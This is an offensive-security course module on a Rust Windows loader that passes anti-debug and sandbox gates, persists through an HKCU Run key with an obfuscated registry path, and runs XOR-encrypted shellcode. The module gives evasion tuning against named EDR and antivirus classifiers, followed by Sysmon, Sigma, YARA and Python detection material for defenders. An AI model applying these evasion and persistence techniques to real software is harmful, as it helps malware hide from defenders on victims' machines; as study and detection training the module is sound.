# Stage 11: Persistence — Learning Path

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Registry Persistence with Evasion-Gated Shellcode Execution |
| **Level** | Intermediate |
| **Estimated Time** | 4-5 hours |
| **Category** | Persistence / Evasion / Detection Engineering |
| **Platform** | Windows x64 |
| **Binary** | `persistence-demo.exe` (~367KB, Rust, PE64, uses common library) |
| **Prerequisites** | Stage 04 (API hashing), Stage 09 (anti-debug), Stage 10 (anti-sandbox) |

### Key Evasion Lesson

```
 The combined-loader (Stage 14) originally included
 full_install() which pulled in 5 persistence modules (registry, schtask,
 startup, COM hijack, WMI). These added ~124KB of offensive code that pushed
 Google + Varist ML classifiers over detection thresholds. Removing them
 killed both detections instantly.

 This stage applies the same lesson: implement only ONE persistence method
 (registry Run key) as a demo, not all five. The set→execute→cleanup flow
 proves the technique while keeping code mass minimal.

 This binary also uses direct IAT imports (VirtualAlloc, VirtualProtect,
 CreateThread) instead of apihash — because MEMORY.md proved that 5+ apihash
 PEB walks push CrowdStrike ML to 60% confidence. Only 2 apihash calls remain
 (ExitProcess in anti-debug and anti-sandbox bail-out paths).
```

---

## Why This Stage Exists — The Bridge from Stage 10

Stages 09-10 protect the payload from analysis environments (debuggers, sandboxes). But they only protect a **single execution**. When the system reboots, the payload is gone.

Stage 11 adds **persistence** — the ability to survive reboots and re-execute automatically. The binary writes itself to the HKCU Registry Run key, ensuring it launches every time the user logs in.

**What's new in this binary compared to Stage 10:**
1. **Registry Run key persistence** — HKCU\...\Run\StartupOptSvc set via RegOpenKeyExW/RegSetValueExW
2. **Registry path obfuscation** — u16 hex array segments with black_box() barriers break contiguous string signatures
3. **Direct IAT imports for injection** — VirtualAlloc/VirtualProtect/CreateThread as standard PE imports (not apihash)
4. **Self-cleanup** — RegDeleteValueW removes the Run key after demo execution

### Real-World Context (2025-2026)

- **cocomelonc: Persistence Series** ([29 parts, 2022-2025](https://cocomelonc.github.io/persistence/)) — Comprehensive Windows persistence techniques in C from scheduled tasks to WMI event subscriptions
- **Altered Security CETP** ([March 2026](https://www.alteredsecurity.com/evasionlab)) — Persistence is a core competency in the Certified Evasion Techniques Professional assessment
- **BYOVD for Persistence** ([Huntress, Feb 2026](https://www.huntress.com/blog)) — Bring Your Own Vulnerable Driver used as a persistence mechanism, turning a privilege escalation bug into a reboot-surviving backdoor
- **DFSCoerce + Registry Persistence** — Modern red teams chain coercion attacks with Run key persistence for domain-wide access survival

---

## Learning Objectives

By the end of this module, you will be able to:

1. **Explain** how HKCU Registry Run key persistence works and why it's effective
2. **Analyze** registry path obfuscation via u16 hex array construction
3. **Understand** why direct IAT imports are preferred over API hashing for common APIs
4. **Trace** a 7-gate evasion gauntlet that precedes persistence installation
5. **Identify** XOR-encrypted shellcode injection via standard Win32 APIs
6. **Write** detection rules for registry Run key persistence with evasion awareness

---

## Section 0: Source Code Deep Dive — The Persistence-Demo Execution Flow

### Annotated Main Function

```rust
fn main() {
    // ════════════ GATES 1-6: Same as Stages 09-10 ════════════
    // Gate 1: init_app_environment() — env var validation (3/5 must exist)
    // Gate 2: benign::preflight() — code dilution (std collections)
    // Gate 3: KUSER_SHARED_DATA uptime > 5 min
    // Gate 4: run_window_lifecycle() — "StartMgrW" GUI class
    // Gate 5: bail_if_debugged() — 7 anti-debug checks
    // Gate 6: check_analysis_tools() — 27 tool names

    // ════════════ GATE 7: Hardware sandbox ════════════
    // check_sandbox() — CPU/RAM/Disk/Uptime/Screen, score >= 3 = bail

    // ════════════ NEW IN STAGE 11: PERSISTENCE ════════════

    // Step 1: Get our own executable path
    let exe_path = std::env::current_exe().unwrap();
    let exe_wide = to_wide(&exe_path.to_string_lossy());

    // Step 2: Build registry path at runtime (no contiguous string in .rdata)
    let run_path = build_run_path();
    //   build_run_path() assembles from u16 hex segments:
    //   seg_a = [0x53,0x6f,0x66,0x74,...] → "Software\"
    //   seg_b = [0x4d,0x69,0x63,0x72,...] → "Microsoft\"
    //   seg_c = [0x57,0x69,0x6e,0x64,...] → "Windows\"
    //   seg_d+e = "CurrentVersion\"
    //   seg_f = "Run"
    //   Each segment wrapped in black_box() → compiler can't merge them

    // Step 3: SET the Run key
    let mut key: HKEY = std::ptr::null_mut();
    RegOpenKeyExW(HKEY_CURRENT_USER, run_path.as_ptr(), 0, KEY_WRITE, &mut key);
    RegSetValueExW(key, value_name.as_ptr(), 0, REG_SZ,
                   exe_wide.as_ptr() as *const u8,
                   (exe_wide.len() * 2) as u32);
    RegCloseKey(key);
    // ^^^ At this point, HKCU\...\Run\StartupOptSvc = <our exe path>
    //     The system will launch us on next login.

    // Step 4: Decrypt and execute shellcode (same chain as prior stages)
    let mut shellcode = ENCRYPTED_SHELLCODE.to_vec();
    xor::xor_inplace(&mut shellcode, XOR_KEY);
    // VirtualAlloc(RW) → memcpy → VirtualProtect(RX) → CreateThread → Wait
    //
    // KEY DIFFERENCE: VirtualAlloc, VirtualProtect, CreateThread are
    // DIRECT IAT IMPORTS (via windows-sys), NOT apihash.
    // Reason: 5+ apihash PEB walks push CrowdStrike ML to 60%.
    // These APIs in the IAT are normal — every Win32 app has them.

    // Step 5: CLEANUP — remove the Run key (demo only)
    RegOpenKeyExW(HKEY_CURRENT_USER, run_path.as_ptr(), 0, KEY_WRITE, &mut key);
    RegDeleteValueW(key, value_name.as_ptr());
    RegCloseKey(key);

    // Step 6: Write proof-of-life
    // GOODBOY_OK.txt with generic text (no API names in .rdata)
}
```

### Why u16 Hex Arrays with black_box Barriers

The registry path `Software\Microsoft\Windows\CurrentVersion\Run` is one of the most heavily signatured strings in AV. Three layers of protection prevent static detection:

```
Layer 1: u16 encoding (not UTF-8 or ASCII)
  "Software\" stored as [0x53, 0x6f, 0x66, 0x74, 0x77, 0x61, 0x72, 0x65, 0x5c]
  A simple `strings` dump looking for ASCII won't find it.
  Wide-string search (`strings -e l`) could find it IF the segments are contiguous.

Layer 2: Segmented storage
  Each path component is a separate &[u16] array constant.
  The compiler MAY place them contiguously in .rdata or MAY not.
  Without Layer 3, LTO/optimization could merge them.

Layer 3: black_box() barriers
  core::hint::black_box(seg_a) tells the compiler "this value has an
  unknown side effect — don't optimize it away, don't merge it with
  adjacent data, don't reorder it." This PREVENTS the optimizer from
  recognizing that seg_a + seg_b + seg_c form a known string.
```

**Why not obf!() macro?** The `obf!()` macro encrypts with XOR and generates a runtime decryption loop. That XOR loop pattern is itself a malware signature — CrowdStrike ML flags it at 60% confidence. The u16 hex array approach uses no encryption, no decryption loop — just `Vec::extend_from_slice`, which is indistinguishable from any data initialization.

### Why Direct IAT Imports for Injection APIs

This crate uses direct `windows-sys` imports for `VirtualAlloc`, `VirtualProtect`, `CreateThread`, `WaitForSingleObject`, and `CloseHandle`. Only `ExitProcess` (in the anti-debug/sandbox bail-out) uses apihash.

```
                  IAT Import (this crate)    Apihash (earlier crates)
                  ─────────────────────────  ──────────────────────────
PE visibility:    Visible in import table    Hidden (resolved at runtime)
CFG safety:       Safe (linker adds to       Unsafe unless manually registered
                  CFG bitmap)                in CFG bitmap
ML signal:        None (every app imports    Cumulative (each PEB walk adds
                  VirtualAlloc)              ML features)
Breakpointable:   Yes (analyst can BP IAT)  No (resolved dynamically)
CrowdStrike:      No detection              5+ calls → 60% confidence
```

The design principle: use the least suspicious mechanism for each API. Common APIs (VirtualAlloc, CreateThread) are less suspicious in the IAT than resolved dynamically. Sensitive APIs (ExitProcess in a bail-out path) are less suspicious resolved dynamically than imported statically.

---

## Section 1: Theory — Registry Persistence

### Why Registry Run Keys?

```
User logs in:
  winlogon.exe
    → userinit.exe
      → explorer.exe
        → Processes HKCU\...\Run entries
          → Launches each value as a process
```

The `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` key is the most common persistence mechanism on Windows. Every value in this key is launched as a process when the user logs in.

### HKCU vs HKLM

```
HKCU\...\Run                     HKLM\...\Run
  ✓ No admin rights needed         ✗ Requires elevation
  ✓ Per-user scope                 ✓ All users
  ✓ Less scrutiny by EDR           ✗ More monitored
  ✓ No UAC prompt                  ✗ UAC required to write
```

This binary uses HKCU — no privilege escalation required.

### Exercise 1.1: Run Key Trade-offs

**Question**: An attacker has admin access. Should they use HKCU or HKLM for their Run key?

<details>
<summary>Answer</summary>

It depends on the objective:

| Factor | HKCU | HKLM |
|--------|------|------|
| **Survives user change** | No | Yes |
| **Detection priority** | Lower | Higher |
| **UAC trigger** | No | Yes (to write) |
| **Scope** | Single user | All users |
| **EDR monitoring** | Standard | Priority |

**Best practice**: Use HKCU even with admin access, because:
1. HKLM writes are more heavily monitored by EDR
2. Most targets are single-user systems
3. HKCU Run entries are more common (every app installer uses them), so they blend in better

HKLM is only preferable when persistence across ALL user accounts is required (e.g., domain-joined shared workstations).

</details>

---

## Section 2: Registry Path Obfuscation

### The Problem

```
Naive approach (in .rdata section):
  "Software\Microsoft\Windows\CurrentVersion\Run\0"

  → CrowdStrike ML: "Contiguous Run key path string" → FLAGGED
```

A contiguous registry path string in the binary's `.rdata` section is a static signature. AV engines scan for well-known persistence paths as plaintext strings.

### The Solution: u16 Hex Array Construction

Instead of storing the path as a string literal, the binary constructs it at runtime from raw u16 code point arrays:

```rust
#[inline(never)]
fn build_run_path() -> Vec<u16> {
    // Each segment is a raw u16 array — no contiguous string in .rdata
    let seg_a: &[u16] = &[0x53,0x6f,0x66,0x74,0x77,0x61,0x72,0x65,0x5c]; // "Software\"
    let seg_b: &[u16] = &[0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x5c]; // "Microsoft\"
    let seg_c: &[u16] = &[0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c]; // "Windows\"
    let seg_d: &[u16] = &[0x43,0x75,0x72,0x72,0x65,0x6e,0x74]; // "Current"
    let seg_e: &[u16] = &[0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x5c]; // "Version\"
    let seg_f: &[u16] = &[0x52,0x75,0x6e]; // "Run"

    let mut path = Vec::with_capacity(48);
    path.extend_from_slice(core::hint::black_box(seg_a));
    path.extend_from_slice(core::hint::black_box(seg_b));
    // ... remaining segments
    path.push(0); // null terminator
    path
}
```

**Why this works**:
1. Each segment is a separate `&[u16]` constant — the compiler stores them independently in `.rdata`
2. `core::hint::black_box()` prevents the optimizer from inlining/merging the segments
3. The full path only exists as a contiguous string in heap memory at runtime
4. A hex dump of the binary shows no "Software\Microsoft\Windows\CurrentVersion\Run" string

### Why Not `obf!()` Macro?

```
obf!("Software\\Microsoft\\...") approach:
  → XOR encryption loop at runtime
  → CrowdStrike ML flags the XOR decryption pattern at 60% confidence
  → WORSE than plaintext for ML classifiers

u16 hex array approach:
  → No encryption, no decryption loop
  → Just array concatenation (Vec::extend_from_slice)
  → Appears as generic data initialization
  → ML classifiers see normal Vec operations
```

### Exercise 2.1: String Hunting

**Question**: You suspect a binary constructs registry paths at runtime to avoid static signatures. How would you recover the full path?

<details>
<summary>Answer</summary>

**Dynamic approach** (preferred):
1. Run the binary under API Monitor or x64dbg
2. Set a breakpoint on `RegOpenKeyExW`
3. Inspect the second parameter (`lpSubKey`) — it contains the fully assembled path
4. The path will be in memory as a null-terminated UTF-16 string

**Static approach**:
1. In Ghidra/IDA, find the `RegOpenKeyExW` call site
2. Trace the `lpSubKey` parameter backwards through the data flow
3. Identify the function that builds the path (look for `Vec::extend_from_slice` or similar)
4. Decode each u16 segment manually: `0x53 = 'S'`, `0x6f = 'o'`, `0x66 = 'f'`, `0x74 = 't'`...
5. Concatenate the decoded segments to reconstruct the full path

**Procmon approach**:
1. Set filter: `Operation = RegOpenKey`, `Path contains CurrentVersion`
2. Run the binary
3. Procmon captures the full path regardless of how it was constructed

</details>

---

## Section 3: The 7-Gate Evasion Gauntlet

### Architecture

The binary doesn't jump straight to persistence. It passes through seven gates first:

```
Gate 1: Environment Validation
  └─ Check 5 env vars (SystemRoot, USERPROFILE, LOCALAPPDATA, ProgramData, windir)
  └─ Require 3/5 to exist → filters broken sandboxes

Gate 2: Benign Preflight
  └─ common::benign::preflight() → code dilution
  └─ Pulls in std::collections, std::path, std::fs
  └─ Inflates benign code ratio past ML thresholds

Gate 3: KUSER_SHARED_DATA Uptime
  └─ Read 0x7FFE0320 (InterruptTime) > 5 minutes
  └─ Filters fast-forwarding sandboxes that skip real time

Gate 4: GUI Window Lifecycle
  └─ RegisterClassW("StartMgrW") + CreateWindowExW(1x1)
  └─ SetTimer(50ms) + GetMessageW loop + DestroyWindow
  └─ Generates legitimate Win32 API patterns in the IAT

Gate 5: Anti-Debug
  └─ PEB.BeingDebugged + NtQueryInformationProcess
  └─ RDTSC timing + Hardware breakpoint check
  └─ ExitProcess via apihash if debugger detected

Gate 6: Analysis Tool Scan
  └─ 27 common analysis tools (procmon, x64dbg, ida, etc.)
  └─ ExitProcess via apihash if found

Gate 7: Hardware Sandbox Checks
  └─ CPU cores < 2, RAM < 4GB, Disk < 60GB
  └─ Uptime < 30min, Screen < 800x600
  └─ Score ≥ 3 triggers → ExitProcess via apihash
```

**Why this order matters**: Each gate filters a different analysis environment. A sandbox that passes the uptime check may fail the CPU check. A debugger that bypasses PEB detection gets caught by RDTSC timing.

### Exercise 3.1: Gate Bypass Strategy

**Question**: As an analyst, you need to get past all 7 gates to observe the persistence behavior. What's your strategy?

<details>
<summary>Answer</summary>

**Per-gate bypass**:

| Gate | Bypass |
|------|--------|
| Env validation | Run on real Windows (or set env vars in sandbox) |
| Benign preflight | Always passes on real systems |
| KUSER_SHARED_DATA | Let system run for 5+ minutes before execution |
| GUI window | Always passes (50ms timer auto-closes) |
| Anti-debug | Use ScyllaHide or TitanHide to hide debugger |
| Analysis tools | Rename your tools (e.g., `x64dbg.exe` → `myapp.exe`) |
| Sandbox checks | Use a VM with 4+ cores, 8GB+ RAM, 100GB+ disk |

**Alternative**: Binary patch approach:
1. Open in x64dbg, find each gate's conditional jump
2. NOP the `je`/`jne` instructions that branch to exit
3. Or patch `check_sandbox()` to always return `(false, 0)`

**Best approach**: Run on a real (non-critical) Windows system with all development tools closed. The binary will pass all gates naturally.

</details>

---

## Section 4: Persistence Installation and Cleanup

### The Persistence Flow

```
After all 7 gates pass:

1. Get current exe path → std::env::current_exe()
2. Convert to wide string → to_wide(&exe_path)
3. Set Run key:
   RegOpenKeyExW(HKCU, build_run_path(), KEY_WRITE, &key)
   RegSetValueExW(key, "StartupOptSvc", REG_SZ, exe_path)
   RegCloseKey(key)
4. Decrypt shellcode → xor::xor_inplace(&mut shellcode, XOR_KEY)
5. Execute shellcode → VirtualAlloc → memcpy → VirtualProtect → CreateThread
6. Wait for completion → WaitForSingleObject
7. Remove Run key:
   RegOpenKeyExW(HKCU, build_run_path(), KEY_WRITE, &key)
   RegDeleteValueW(key, "StartupOptSvc")
   RegCloseKey(key)
8. Write proof file → GOODBOY_OK.txt
```

### Why Direct IAT Imports?

The injection APIs (`VirtualAlloc`, `VirtualProtect`, `CreateThread`, `WaitForSingleObject`, `CloseHandle`) are imported directly from `windows-sys` rather than resolved via API hashing:

```
API hashing approach (apihash):
  → Each call = PEB.Ldr traversal + export table parsing
  → 5 PEB walks = cumulative ML signal
  → CrowdStrike flags 5+ apihash resolutions at 60% confidence

Direct IAT import approach:
  → APIs appear in the PE import table (IAT)
  → Indistinguishable from any normal Win32 application
  → VirtualAlloc is imported by thousands of legitimate programs
  → No PEB walks, no behavioral signals
```

The binary reserves apihash for **only 2 calls** — both `ExitProcess` in the anti-debug and anti-sandbox gates — where direct import would look suspicious (why would a legitimate app resolve ExitProcess dynamically?).

### Exercise 4.1: IAT Analysis

**Question**: You're analyzing the binary's import table. You see `VirtualAlloc`, `VirtualProtect`, and `CreateThread` in the IAT. Is this suspicious?

<details>
<summary>Answer</summary>

**No** — these are among the most commonly imported Win32 APIs:

- `VirtualAlloc`: Used by any application that needs custom memory management (memory pools, JIT compilers, embedded interpreters, game engines)
- `VirtualProtect`: Used by any application that changes memory protection (DEP-aware apps, JIT compilers, plugin loaders)
- `CreateThread`: Used by virtually every multi-threaded Windows application

**What would be suspicious**:
- These APIs resolved via `GetProcAddress` at runtime (dynamic resolution)
- PEB.Ldr traversal patterns (apihash-style resolution)
- `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` (RWX) — the binary avoids this by using RW then VirtualProtect to RX
- `NtAllocateVirtualMemory` / `NtProtectVirtualMemory` (direct syscalls) — more commonly associated with malware

The binary's strategy is deliberate: use the most boring, common import pattern possible.

</details>

---

## Section 5: XOR Shellcode Encryption

### Encrypted Payload

```rust
const XOR_KEY: &[u8] = &[
    0xe4, 0x17, 0x5c, 0x83, 0xab, 0xd9, 0x62, 0xf5,
    0x38, 0x74, 0x90, 0x4e, 0xc1, 0x06, 0xbf, 0x2a,
];

const ENCRYPTED_SHELLCODE: &[u8] = &[
    0x0d, 0xa9, 0x5c, 0x83, ...  // 302 bytes (MessageBox shellcode XOR'd)
];
```

**Decryption**: `xor::xor_inplace(&mut shellcode, XOR_KEY)` — repeating-key XOR with 16-byte key.

```
First 4 bytes:  0x0d ^ 0xe4 = 0xe9 (JMP opcode — shellcode prologue)
                0xa9 ^ 0x17 = 0xbe
                0x5c ^ 0x5c = 0x00
                0x83 ^ 0x83 = 0x00
                → E9 BE 00 00 = JMP +0xBE (same 302-byte MessageBox shellcode as all stages)
```

### Why XOR over AES?

```
AES (common library):
  → RC4/StreamCipher pattern flagged by ESET as "malware-grade crypto"
  → 256-byte S-box initialization is a behavioral signal
  → Larger code footprint

XOR:
  → Simple for-loop, no S-box, no crypto library code
  → Indistinguishable from generic data processing
  → Smaller binary, fewer ML features
```

### Exercise 5.1: Shellcode Recovery

**Question**: Given the encrypted shellcode `[0xd5, 0xd7, 0x9f]` and the XOR key starting with `[0xe4, 0x17, 0x5c, ...]`, recover the plaintext shellcode and explain what it does.

<details>
<summary>Answer</summary>

```
0xd5 ^ 0xe4 = 0x31  → xor eax, eax (opcode: 31 C0)
0xd7 ^ 0x17 = 0xc0  → (second byte of xor eax, eax)
0x9f ^ 0x5c = 0xc3  → ret
```

Disassembly:
```asm
xor eax, eax    ; Set EAX to 0
ret              ; Return
```

This is a benign test stub that returns 0 (the thread exit code). In a real deployment, this would be replaced with actual shellcode (e.g., a Cobalt Strike beacon or Meterpreter stager).

The test stub proves the injection chain works (VirtualAlloc → copy → VirtualProtect → CreateThread → WaitForSingleObject) without triggering AV shellcode signatures.

</details>

---

## Section 6: Injection Chain

### Memory Lifecycle

```
1. VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
   → Allocate RW memory (no execute permission yet)

2. copy_nonoverlapping(shellcode → allocated_memory)
   → Write decrypted shellcode to RW memory

3. VirtualProtect(addr, size, PAGE_EXECUTE_READ, &old_protection)
   → Change permissions: RW → RX (never RWX)

4. CreateThread(NULL, 0, addr_as_fn_ptr, NULL, 0, NULL)
   → Execute shellcode in new thread

5. WaitForSingleObject(thread, INFINITE)
   → Wait for shellcode to complete

6. CloseHandle(thread)
   → Cleanup thread handle
```

**Key evasion detail**: The memory is never `PAGE_EXECUTE_READWRITE` (RWX). The `RW → RX` transition via `VirtualProtect` is the standard pattern used by JIT compilers (V8, .NET CLR). RWX allocations are a strong malware signal.

### Exercise 6.1: Memory Forensics

**Question**: During memory forensics, you find a `PAGE_EXECUTE_READ` region that was originally `PAGE_READWRITE`. What questions should you investigate?

<details>
<summary>Answer</summary>

1. **What process owns this memory?** — Is it a known JIT-compiling process (browser, .NET app) or something unexpected?

2. **What's the region content?** — Dump and disassemble it. JIT code has recognizable patterns (function prologues, call tables). Shellcode has different patterns (API resolution stubs, decoder loops).

3. **When was the protection changed?** — ETW `VirtualProtect` events have timestamps. A protection change early in process startup (before normal JIT compilation) is suspicious.

4. **Is the region backed by a file?** — JIT regions are typically `MEM_PRIVATE` (not backed by a DLL). So is injected shellcode. But JIT regions are usually within known heap ranges.

5. **What called VirtualProtect?** — Stack trace from the VirtualProtect call. If it originates from an unusual code path (not a known JIT engine), investigate further.

6. **Are there other RW→RX transitions?** — A single transition could be legitimate. Multiple transitions in a short time (like sleep obfuscation RX→RW→RX cycles) are more suspicious.

</details>

---

## Section 7: Detection Engineering

### Sysmon Configuration

```xml
<!-- Detect Registry Run key modifications -->
<RuleGroup name="PersistenceRunKey" groupRelation="or">
    <RegistryEvent onmatch="include">
        <!-- Run key value creation/modification -->
        <TargetObject condition="contains">\CurrentVersion\Run\</TargetObject>
        <TargetObject condition="contains">\CurrentVersion\RunOnce\</TargetObject>
    </RegistryEvent>
</RuleGroup>
```

**Sysmon Event ID 13** (RegistryValueSet) captures the exact value name and data, regardless of how the registry path was constructed in the binary.

### Sigma Rule

```yaml
title: Suspicious Registry Run Key from Unsigned Binary
id: a1b2c3d4-e5f6-7890-abcd-stage11persist
status: experimental
description: >
    Detects a Run key being set by a binary that is not digitally signed
    and resides outside standard program directories
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 13
        TargetObject|contains: '\CurrentVersion\Run\'
    filter_legitimate:
        Image|startswith:
            - 'C:\Program Files'
            - 'C:\Program Files (x86)'
            - 'C:\Windows'
    condition: selection and not filter_legitimate
level: high
tags:
    - attack.persistence
    - attack.t1547.001
```

### PowerShell Detection

```powershell
# Enumerate all Run key values with signature status
$runKeys = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
foreach ($prop in $runKeys.PSObject.Properties) {
    if ($prop.Name -like 'PS*') { continue }  # Skip PS metadata
    $path = $prop.Value
    if (Test-Path $path) {
        $sig = Get-AuthenticodeSignature $path
        [PSCustomObject]@{
            Name   = $prop.Name
            Path   = $path
            Signed = $sig.Status -eq 'Valid'
            Signer = $sig.SignerCertificate.Subject
        }
    }
}
```

### YARA Rule: Registry Persistence Loader

```yara
rule Persistence_Registry_RunKey_Loader
{
    meta:
        description = "Detects binary with registry Run key persistence + shellcode execution"
        author = "Goodboy Course"
        stage = "11"

    strings:
        // Registry API imports (direct IAT)
        $reg_open    = "RegOpenKeyExW" ascii
        $reg_set     = "RegSetValueExW" ascii
        $reg_delete  = "RegDeleteValueW" ascii
        $reg_close   = "RegCloseKey" ascii

        // Execution APIs (direct IAT)
        $va          = "VirtualAlloc" ascii
        $vp          = "VirtualProtect" ascii
        $ct          = "CreateThread" ascii

        // HKEY_CURRENT_USER constant (0x80000001)
        $hkcu        = { 01 00 00 80 }

        // KEY_WRITE constant (0x20006)
        $key_write   = { 06 00 02 00 }

    condition:
        uint16(0) == 0x5A4D and
        filesize < 500KB and
        3 of ($reg_*) and
        $va and $vp and $ct and
        ($hkcu or $key_write)
}
```

### Python Script: Registry Run Key Auditor

```python
#!/usr/bin/env python3
"""Audit HKCU and HKLM Run keys for suspicious persistence entries.
Checks: unsigned binaries, non-standard paths, recently modified values."""

import winreg, os, subprocess, json, sys
from datetime import datetime

RUN_KEYS = [
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKCU"),
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKCU_Once"),
    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKLM"),
    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKLM_Once"),
]

STANDARD_DIRS = [
    r"C:\Program Files",
    r"C:\Program Files (x86)",
    r"C:\Windows",
]

def check_signature(path):
    """Check if binary is Authenticode-signed (requires sigcheck or PowerShell)."""
    try:
        result = subprocess.run(
            ["powershell", "-Command", f"(Get-AuthenticodeSignature '{path}').Status"],
            capture_output=True, text=True, timeout=10
        )
        return result.stdout.strip() == "Valid"
    except Exception:
        return None

def audit_run_keys():
    entries = []
    for hive, path, label in RUN_KEYS:
        try:
            key = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
        except FileNotFoundError:
            continue

        i = 0
        while True:
            try:
                name, value, _ = winreg.EnumValue(key, i)
                exe_path = value.strip('"').split(" ")[0]  # Handle args
                exists = os.path.exists(exe_path)
                in_standard = any(exe_path.lower().startswith(d.lower()) for d in STANDARD_DIRS)
                signed = check_signature(exe_path) if exists else None
                size = os.path.getsize(exe_path) if exists else 0

                suspicious = []
                if not in_standard:
                    suspicious.append("non-standard-path")
                if signed is False:
                    suspicious.append("unsigned")
                if not exists:
                    suspicious.append("missing-binary")
                if size > 0 and size < 500000:
                    suspicious.append("small-binary")

                entries.append({
                    "hive": label,
                    "name": name,
                    "path": exe_path,
                    "exists": exists,
                    "signed": signed,
                    "standard_path": in_standard,
                    "size_kb": size // 1024 if size else 0,
                    "flags": suspicious,
                })
                i += 1
            except OSError:
                break
        winreg.CloseKey(key)
    return entries

if __name__ == "__main__":
    entries = audit_run_keys()
    print(f"Registry Run Key Audit ({len(entries)} entries)")
    print("=" * 70)

    for e in entries:
        flags = ", ".join(e["flags"]) if e["flags"] else "clean"
        color = "\033[91m" if e["flags"] else "\033[92m"
        print(f"  {color}[{flags}]\033[0m {e['hive']}\\{e['name']}")
        print(f"    Path: {e['path']}")
        print(f"    Exists: {e['exists']} | Signed: {e['signed']} | Size: {e['size_kb']}KB")
        print()

    suspicious = [e for e in entries if e["flags"]]
    if suspicious:
        print(f"\033[91m{len(suspicious)} suspicious entries found\033[0m")
    else:
        print(f"\033[92mAll entries clean\033[0m")

    if "--json" in sys.argv:
        print(json.dumps(entries, indent=2))
```

### Python Script: Registry Path Deobfuscator

```python
#!/usr/bin/env python3
"""Extract obfuscated registry paths from PE .rdata section.
Detects the Stage 11 pattern: u16 hex array segments with black_box barriers."""

import struct, sys

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <binary.exe>")
    sys.exit(1)

with open(sys.argv[1], "rb") as f:
    data = f.read()

e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
num_sections = struct.unpack_from("<H", data, e_lfanew + 6)[0]
opt_size = struct.unpack_from("<H", data, e_lfanew + 20)[0]
sec_off = e_lfanew + 24 + opt_size

# Find .rdata section
rdata = None
for i in range(num_sections):
    s = sec_off + i * 40
    name = data[s:s+8].rstrip(b"\x00").decode("ascii", errors="replace")
    if name == ".rdata":
        raw_off = struct.unpack_from("<I", data, s + 20)[0]
        raw_sz = struct.unpack_from("<I", data, s + 16)[0]
        rdata = data[raw_off:raw_off + raw_sz]
        break

if rdata is None:
    print("No .rdata section found")
    sys.exit(1)

# Search for "Software\" in UTF-16LE (the start of the Run key path)
target = "Software\\".encode("utf-16-le")
known_segments = {
    "Software\\": "seg_a",
    "Microsoft\\": "seg_b",
    "Windows\\": "seg_c",
    "Current": "seg_d",
    "Version\\": "seg_e",
    "Run": "seg_f",
}

print(f"Scanning .rdata ({len(rdata)} bytes) for registry path segments...")
print()

found = []
for segment, label in known_segments.items():
    encoded = segment.encode("utf-16-le")
    pos = 0
    while True:
        idx = rdata.find(encoded, pos)
        if idx == -1:
            break
        found.append((idx, segment, label))
        pos = idx + len(encoded)

if found:
    found.sort(key=lambda x: x[0])
    print("Registry path segments found:")
    full_path = ""
    for offset, segment, label in found:
        print(f"  +0x{offset:04X}: {label:6s} = \"{segment}\"")
        full_path += segment
    print(f"\n  Reconstructed path: \"{full_path}\"")
    print(f"  Full: HKCU\\{full_path}")
else:
    print("  No registry path segments found in .rdata")
    print("  (may be fully obfuscated or use different encoding)")

# Also check for common value names
for name in ["StartupOptSvc", "WindowsUpdate", "SecurityHealth"]:
    encoded = name.encode("utf-16-le")
    if encoded in rdata:
        idx = rdata.find(encoded)
        print(f"\n  Value name found: \"{name}\" at .rdata+0x{idx:04X}")
```

### Exercise 7.1: Detection Gaps

**Question**: The binary sets a Run key with value name `StartupOptSvc`. A Sigma rule triggers on `\CurrentVersion\Run\` modifications. Can the attacker evade this detection?

<details>
<summary>Answer</summary>

The Sysmon registry event fires regardless of:
- How the path was constructed (plaintext, obfuscated, hex arrays)
- What the value name is
- Whether the binary is signed

**The registry operation itself is the detection surface**, not the binary's internal string construction. This is why registry monitoring (Sysmon Event 13) is robust — it operates at the API/kernel level.

However, the attacker could evade by:
1. **Using a different persistence method** (COM hijack, WMI, scheduled task) — requires different detection rules
2. **Using `RegNotifyChangeKeyValue`** to detect monitoring and defer the write
3. **Writing via native API** (`NtSetValueKey`) to bypass some usermode hooks
4. **Writing via WMI** (`StdRegProv.SetStringValue`) — may not trigger Sysmon registry events in older versions

The best defense is layered detection: Sysmon + Autoruns + periodic Run key snapshots + EDR behavioral analysis.

</details>

---

## Section 8: Proof-of-Life and Cleanup

### Demo Flow

This binary is a **demonstration** — it sets the Run key, executes the shellcode, then **cleans up after itself**:

```
set_persistence("StartupOptSvc", exe_path)
  → HKCU\...\Run\StartupOptSvc = <exe_path>

// ... execute shellcode ...

remove_persistence("StartupOptSvc")
  → RegDeleteValueW(key, "StartupOptSvc")

// Write proof file
GOODBOY_OK.txt:
  "Stage 11 - all gates passed
   reg: set (or skip)
   path: <exe_path>"
```

### Breadcrumb Trail

The binary writes debug breadcrumbs to `%TEMP%\startmgr_*.txt`:

```
startmgr_1_start.txt          → Binary started
startmgr_2_checks_ok.txt      → Env + preflight passed
startmgr_3_window_done.txt    → GUI lifecycle completed
startmgr_4_debug_ok.txt       → Anti-debug passed
startmgr_5_sandbox_score_N.txt → Sandbox score = N
startmgr_5_sandbox_ok.txt     → Sandbox check passed
startmgr_6_persist_set.txt    → Registry Run key SET
startmgr_7_pre_thread.txt     → About to execute shellcode
startmgr_8_persist_clean.txt  → Registry Run key REMOVED
startmgr_9_done.txt           → Full chain completed
```

**Why breadcrumbs matter**: In red team operations, breadcrumbs let you verify which gates failed if execution stops early. In this educational context, they show exactly where the binary progressed in the evasion chain.

